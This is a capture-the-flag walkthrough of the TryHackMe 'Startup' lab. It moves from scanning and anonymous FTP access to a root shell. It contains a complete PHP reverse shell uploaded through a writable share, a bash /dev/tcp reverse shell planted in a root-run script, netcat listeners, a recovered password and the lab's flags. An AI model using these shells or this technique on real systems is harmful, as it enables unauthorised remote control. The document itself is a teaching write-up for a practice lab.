#   Tryhackme - Startup
##  IP = 

##  Walkthrough by
```
Shaswata Saha
09-07-2023
12:22PM

```

##  Steps:
1.  nmap scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-09 02:48 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:48
Completed NSE at 02:48, 0.00s elapsed
Initiating NSE at 02:48
Completed NSE at 02:48, 0.00s elapsed
Initiating NSE at 02:48
Completed NSE at 02:48, 0.00s elapsed
Initiating Ping Scan at 02:48
Scanning 10.10.115.63 [2 ports]
Completed Ping Scan at 02:48, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:48
Completed Parallel DNS resolution of 1 host. at 02:48, 0.22s elapsed
Initiating Connect Scan at 02:48
Scanning 10.10.115.63 [1000 ports]
Discovered open port 21/tcp on 10.10.115.63
Discovered open port 80/tcp on 10.10.115.63
Increasing send delay for 10.10.115.63 from 0 to 5 due to 11 out of 36 dropped probes since last increase.
Increasing send delay for 10.10.115.63 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
Discovered open port 22/tcp on 10.10.115.63
Increasing send delay for 10.10.115.63 from 10 to 20 due to 11 out of 14 dropped probes since last increase.
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.22% done; ETC: 02:49 (0:00:29 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.56% done; ETC: 02:49 (0:00:29 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.74% done; ETC: 02:49 (0:00:29 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 40.28% done; ETC: 02:49 (0:00:28 remaining)
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 40.72% done; ETC: 02:49 (0:00:29 remaining)
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 41.02% done; ETC: 02:49 (0:00:29 remaining)
Increasing send delay for 10.10.115.63 from 20 to 40 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.115.63 from 40 to 80 due to max_successful_tryno increase to 5
Completed Connect Scan at 02:49, 71.42s elapsed (1000 total ports)
Initiating Service scan at 02:49
Scanning 3 services on 10.10.115.63
Completed Service scan at 02:49, 6.46s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.115.63.
Initiating NSE at 02:49
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 02:49, 6.90s elapsed
Initiating NSE at 02:49
Completed NSE at 02:49, 1.61s elapsed
Initiating NSE at 02:49
Completed NSE at 02:49, 0.00s elapsed
Nmap scan report for 10.10.115.63
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.28.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 02:49
Completed NSE at 02:49, 0.00s elapsed
Initiating NSE at 02:49
Completed NSE at 02:49, 0.00s elapsed
Initiating NSE at 02:49
Completed NSE at 02:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.58 seconds

```

2.  Gobuster scan:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.115.63 -w Documents/gobuster-wordlist/dsstorewordlist.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.115.63
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/09 02:48:53 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/files                (Status: 301) [Size: 312] [--> http://10.10.115.63/files/]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
Progress: 1820 / 1829 (99.51%)
===============================================================
2023/07/09 02:49:40 Finished
===============================================================
```

3.  In the /files/notice.txt:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

4.  Logging in to ftp server as anonymous with no pass:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Startup]
└─$ ftp 10.10.115.63
Connected to 10.10.115.63.
220 (vsFTPd 3.0.3)
Name (10.10.115.63:subhro1530): Anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

5.  We couldn't get enough info there but we can run a reverse shell through the /ftp/ folder.
```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.17.28.202';  // CHANGE THIS
$port = 9999;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
Storing the reverse shell code into a file named shell.php. 

6.  Placing the shell.php into ftp foldder
```bash
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||20555|)
150 Ok to send data.
100% |************************************************|    79        1.75 MiB/s    00:00 ETA
226 Transfer complete.
79 bytes sent in 00:00 (0.11 KiB/s)
ftp> 

```

7.  Listen to netcat:
```bash
nc -lnvp 9999
```

Make a stable shell through python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

We get the recipe.txt file..!
```bash
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

```

### 8.  Now we need to go to a user to get the user.txt flag:
```bash
www-data@startup:/$ cd /home
cd /home
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied

```
We cant login as lennie..

9.  We find a suspicious file  _suspicious.pcapng_ :
```bash
www-data@startup:/$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp
cp /incidents/suspicious.pcapng /var/www/html/files/ftp
```

10. This is a wireshark file and we can now trace the previous commands that were used. We started to find the fingerprints on the stream 7:

```bash
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```

11. Lets login as lennie!
```bash
www-data@startup:/$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/$ ls
ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
lennie@startup:/$ cd /home
cd /home
lennie@startup:/home$ ls
ls
lennie
lennie@startup:/home$ cd lennie
cd lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

We got the user.txt file..!

###    12. Privelege Escalation
1.  We need to find the /scripts/ folder. We find that the planner.sh file runs the print.sh file in /etc folder. Moreover we alsso find that the root runs the planner.sh file everytime and therefoere the updated time of the planner.sh file is recently updated.

```bash
lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

2.  Now to get into the revershe shell of the root we use bash reverse shell script and set it into print.sh which will be run by the root.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.17.28.202/4444 0>&1
```

3.  We start a netcat listner on port 4444 and wait till the root runs the file automatically and we gain the root shell:
```bash
 nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.17.28.202] from (UNKNOWN) [10.10.115.63] 46912
bash: cannot set terminal process group (2247): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}

```
We got the root..!
